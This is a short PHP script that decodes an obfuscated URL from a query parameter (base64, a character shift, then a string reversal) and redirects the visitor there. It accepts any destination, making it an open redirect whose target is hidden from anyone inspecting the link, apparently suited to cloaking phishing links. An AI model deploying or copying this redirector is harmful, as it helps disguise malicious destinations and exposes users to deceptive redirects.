<?php

function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

function decodeAndProcess($encodedParam) {
    $decodedBase64 = base64_decode($encodedParam, true);

    if ($decodedBase64 === false) {
        return $encodedParam;
    }

    $decodedShift = '';
    for ($i = 0; $i < strlen($decodedBase64); $i++) {
        $decodedShift .= chr(ord($decodedBase64[$i]) - 1);
    }

    return strrev($decodedShift);
}

if (isset($_GET)) {
    $params = array_values($_GET);
    $encodedParam = $params[0] ?? '';

    if ($encodedParam) {
        $finalUrl = decodeAndProcess($encodedParam);

        if (isValidUrl($finalUrl)) {
            header('Location: ' . $finalUrl, true, 302);
            exit();
        } else {
            echo htmlspecialchars($finalUrl);
            exit();
        }
    } else {
        http_response_code(400);
        echo '';
        exit();
    }
} else {
    http_response_code(400);
    echo '';
    exit();
}
?>
